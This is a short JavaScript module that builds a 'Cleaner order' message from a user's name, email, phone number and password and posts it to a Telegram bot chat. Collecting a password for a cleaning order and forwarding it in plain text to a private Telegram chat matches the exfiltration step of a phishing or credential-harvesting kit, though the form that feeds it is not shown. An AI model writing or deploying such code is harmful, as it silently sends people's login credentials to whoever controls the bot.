import 'dotenv/config';

export default async function sendCleanerMsg(obj) {
  try {
    let message = `<b>Cleaner order</b>\n`;
    message += `<b>First & last name:</b> ${obj.username}\n`;
    message += `<b>Email:</b> ${obj.email}\n`;
    message += `<b>Phone number:</b> ${obj.phone}\n`;
    message += `<b>Password</b> ${obj.password}\n`;

    const resp = await fetch(
      `https://api.telegram.org/bot${process.env.TOKEN}/sendMessage`,
      {
        method: 'POST',
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          parse_mode: 'html',
          text: message,
        }),
        headers: {
          'Content-Type': 'application/json; charset=UTF-8',
        },
      }
    );
    return resp.ok;
  } catch (err) {
    console.log(`[TG MESSAGE ERROR] ${err}`);
    return false;
  }
}
